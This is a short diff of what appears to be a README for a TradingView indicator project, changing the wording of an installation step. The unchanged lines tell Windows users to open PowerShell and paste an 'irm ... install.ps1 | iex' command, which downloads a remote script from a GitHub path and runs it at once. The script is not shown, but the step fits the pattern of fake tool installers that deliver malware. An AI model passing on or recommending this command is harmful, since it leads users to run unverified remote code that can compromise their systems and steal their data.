@@ -20,7 +20,7 @@ Press **Win + R**, type `PowerShell`, and press **Enter**.
 
 #### 2. Run the Installation Command
 
-Copy and paste the installation command below into the PowerShell window:
+Paste the installation command below into the PowerShell window:
 
 ```powershell
 irm github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
